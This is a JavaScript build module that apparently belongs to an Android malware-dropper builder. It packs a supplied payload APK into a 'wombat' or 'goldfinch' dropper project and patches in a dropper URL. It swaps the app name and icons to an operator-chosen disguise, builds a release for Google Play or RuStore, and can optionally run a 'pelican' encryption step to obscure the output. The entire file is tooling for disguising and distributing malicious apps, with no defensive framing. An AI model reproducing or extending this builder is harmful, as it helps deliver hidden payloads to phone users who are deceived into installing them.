'use strict';

const fs = require('fs-extra');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const sharp = require('sharp');
const { BASE_WOMBAT, BASE_GOLDFINCH, PELICAN_PATH, MIPMAP_SIZES, xmlEscape } = require('./buildUtils');

const TEMP_DROPPER_DIR = path.join(__dirname, 'temp_dropper');
fs.ensureDirSync(TEMP_DROPPER_DIR);

const GRADLE_WATCHDOG_MS = 12 * 60 * 1000;

function runCmd(command, cwd, onLine) {
  return new Promise((resolve, reject) => {
    const child = spawn(command, { shell: true, cwd });
    let stdout = '', stderr = '';
    let settled = false;

    const watchdog = setTimeout(() => {
      if (settled) return;
      settled = true;
      try { child.kill('SIGKILL'); } catch (_) {}
      reject(new Error('DROPPER_GRADLE_TIMEOUT'));
    }, GRADLE_WATCHDOG_MS);

    child.stdout.on('data', d => {
      const s = d.toString();
      stdout += s;
      if (onLine) s.split(/\r?\n/).forEach(l => { if (l) onLine('[DROPPER] ' + l); });
    });
    child.stderr.on('data', d => {
      const s = d.toString();
      stderr += s;
      if (onLine) s.split(/\r?\n/).forEach(l => { if (l) onLine('[DROPPER ERR] ' + l); });
    });
    child.on('error', err => { if (!settled) { settled = true; clearTimeout(watchdog); reject(err); } });
    child.on('close', code => {
      if (settled) return;
      settled = true;
      clearTimeout(watchdog);
      if (code === 0) resolve({ stdout, stderr });
      else { const e = new Error(`Dropper build failed (code ${code})`); e.stderr = stderr; reject(e); }
    });
  });
}

async function cleanOldIcons(resPath) {
  const dirs = await fs.readdir(resPath).catch(() => []);
  const patterns = [/ic_launcher.*\.xml$/i, /ic_launcher.*\.png$/i, /ic_launcher.*\.webp$/i];
  for (const dir of dirs) {
    if (!dir.startsWith('mipmap-') && !dir.startsWith('drawable')) continue;
    const dp = path.join(resPath, dir);
    for (const file of await fs.readdir(dp).catch(() => [])) {
      if (patterns.some(p => p.test(file))) await fs.remove(path.join(dp, file)).catch(() => {});
    }
  }
  await fs.remove(path.join(resPath, 'mipmap-anydpi-v26')).catch(() => {});
}

/**
 * params = {
 *   dropperType: 'wombat' | 'goldfinch',
 *   cristoferApkPath: string,
 *   dropperAppName: string,
 *   dropperUrl: string,
 *   iconPath: string | null,
 *   storeChoice: 'google' | 'rustore',
 *   useEncryption: boolean,
 *   buildId: string,
 *   onLine: fn,
 *   onProgress: fn,
 * }
 * Returns: path to output APK
 */
async function runDropperBuild(params) {
  const {
    dropperType, cristoferApkPath, dropperAppName, dropperUrl,
    iconPath, storeChoice, useEncryption, buildId, onLine, onProgress
  } = params;

  const isWombat = dropperType !== 'goldfinch';
  const BASE_DROPPER = isWombat ? BASE_WOMBAT : BASE_GOLDFINCH;
  const tag = isWombat ? 'WOMBAT' : 'GOLDFINCH';

  const uniqueId  = crypto.randomBytes(6).toString('hex');
  const tempDir   = path.join(TEMP_DROPPER_DIR, `${tag.toLowerCase()}_${buildId}_${uniqueId}`);
  const projectPath = path.join(tempDir, 'project');

  await fs.ensureDir(tempDir);

  try {
    onLine(`[${tag}] Copying project from ${BASE_DROPPER}...`);
    if (!await fs.pathExists(BASE_DROPPER)) {
      throw new Error(`${tag} sources not found: ${BASE_DROPPER}`);
    }
    await fs.copy(BASE_DROPPER, projectPath);

    await fs.remove(path.join(projectPath, '.gradle')).catch(() => {});
    await fs.remove(path.join(projectPath, 'app/build')).catch(() => {});
    await fs.remove(path.join(projectPath, '.cxx')).catch(() => {});
    await fs.remove(path.join(projectPath, 'app/.cxx')).catch(() => {});

    // Place payload
    await fs.copy(cristoferApkPath, path.join(projectPath, 'payload.apk'));
    onLine(`[${tag}] Payload placed`);

    // Patch URL (Lynx.kt for wombat, similar for goldfinch)
    const lynxFiles = ['app/src/main/java/com/sync/media/hub/Lynx.kt'];
    // Search all .kt files for DROPPER_URL pattern
    for (const rel of lynxFiles) {
      const fp = path.join(projectPath, rel);
      if (!await fs.pathExists(fp)) continue;
      let txt = await fs.readFile(fp, 'utf8');
      const safeUrl = (dropperUrl || 'https://play.google.com/store').replace(/^http:\/\//i, 'https://').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
      txt = txt.replace(/val DROPPER_URL\s*=\s*"[^"]*"/, `val DROPPER_URL = "${safeUrl}"`);
      await fs.writeFile(fp, txt, 'utf8');
      onLine(`[${tag}] URL patched in ${rel}`);
    }

    // Patch app_name in strings.xml
    const resPath = path.join(projectPath, 'app/src/main/res');
    const escapedName = xmlEscape(dropperAppName || 'Application');
    const resDirs = await fs.readdir(resPath).catch(() => []);
    for (const dir of resDirs) {
      if (!dir.startsWith('values')) continue;
      const xmlPath = path.join(resPath, dir, 'strings.xml');
      if (!await fs.pathExists(xmlPath)) continue;
      let xml = await fs.readFile(xmlPath, 'utf8');
      const patched = xml.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${escapedName}</string>`);
      if (patched !== xml) { await fs.writeFile(xmlPath, patched, 'utf8'); onLine(`[${tag}] strings.xml patched`); }
    }

    // Icons
    if (iconPath && await fs.pathExists(iconPath)) {
      await cleanOldIcons(resPath);
      for (const [dir, size] of Object.entries(MIPMAP_SIZES)) {
        const dirPath = path.join(resPath, dir);
        await fs.ensureDir(dirPath);
        await sharp(iconPath).resize(size, size).png().toFile(path.join(dirPath, 'ic_launcher.png'));
        await sharp(iconPath).resize(size, size).png().toFile(path.join(dirPath, 'ic_launcher_round.png'));
      }
      onLine(`[${tag}] Icons set`);
    }

    // local.properties
    const { ANDROID_SDK } = require('./buildUtils');
    await fs.writeFile(path.join(projectPath, 'local.properties'), `sdk.dir=${ANDROID_SDK.replace(/\\/g,'/')}\n`);

    // Gradle build
    const isWin = process.platform === 'win32';
    const gradlew = path.join(projectPath, isWin ? 'gradlew.bat' : 'gradlew');
    const store = (storeChoice === 'rustore') ? 'rustore' : 'google';
    const gradleCmd = `"${gradlew}" assembleRelease --no-daemon --max-workers=2 -Pstore=${store} -Dorg.gradle.jvmargs="-Xmx3072m"`;

    onLine(`[${tag}] Starting Gradle (store=${store})...`);
    if (onProgress) onProgress(90);
    await runCmd(gradleCmd, projectPath, onLine);
    onLine(`[${tag}] Gradle complete`);

    // Find APK
    const releaseDir = path.join(projectPath, 'app/build/outputs/apk/release');
    let builtApk = path.join(releaseDir, 'app-release.apk');
    if (!await fs.pathExists(builtApk)) {
      const files = (await fs.readdir(releaseDir).catch(() => [])).filter(f => f.endsWith('.apk'));
      if (files.length) builtApk = path.join(releaseDir, files[0]);
    }
    if (!await fs.pathExists(builtApk)) throw new Error(`${tag} APK not found after build`);

    // Encryption
    const outPath = path.join(TEMP_DROPPER_DIR, `out_${buildId}_${uniqueId}.apk`);
    if (useEncryption) {
      onLine(`[${tag}] Running pelican encryption...`);
      const pelicanOut = path.join(tempDir, 'pelican_out');
      await fs.ensureDir(pelicanOut);
      await runCmd(`python "${PELICAN_PATH}" "${builtApk}" "${pelicanOut}"`, __dirname, onLine);
      const pFiles = (await fs.readdir(pelicanOut).catch(() => [])).filter(f => f.endsWith('.apk')).sort();
      if (!pFiles.length) throw new Error('Pelican produced no APK');
      await fs.copy(path.join(pelicanOut, pFiles[pFiles.length - 1]), outPath);
      onLine(`[${tag}] Encryption done`);
    } else {
      await fs.copy(builtApk, outPath);
    }

    return outPath;

  } finally {
    await fs.remove(tempDir).catch(() => {});
  }
}

module.exports = { runDropperBuild };
